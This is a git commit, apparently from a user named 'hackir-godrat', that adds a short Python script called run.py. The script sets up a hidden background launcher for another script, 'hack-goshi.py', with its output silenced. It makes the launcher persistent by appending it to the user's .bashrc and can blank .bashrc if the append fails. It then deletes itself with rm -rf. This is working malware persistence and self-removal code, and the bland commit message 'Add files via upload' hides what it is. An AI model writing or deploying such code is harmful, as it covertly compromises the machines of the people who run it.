e505743f034034a5fa93b09dde93b678447891cf
hackir-godrat <95535445+hackir-godrat@users.noreply.github.com>
2022-01-02 18:08:04 +0330

    Add files via upload

---
+++ run.py
@@ -0,0 +1,18 @@
+import os
+os.system('cd $HOME')
+file = open('run.sh' , 'a+')
+file.write('python hackiri/hack-goshi.py &> /dev/null &')
+file.close()
+try:
+    file2 = open('.bashrc' , 'a')
+    file2.write('bash run.sh')
+except:
+    os.system('> .bashrc')
+    file2 = open('.bashrc', 'a')
+    file2.write('bash run.sh')
+while True:
+    try:
+        os.system('rm -rf hackri/run.py')
+        break
+    except:
+        pass
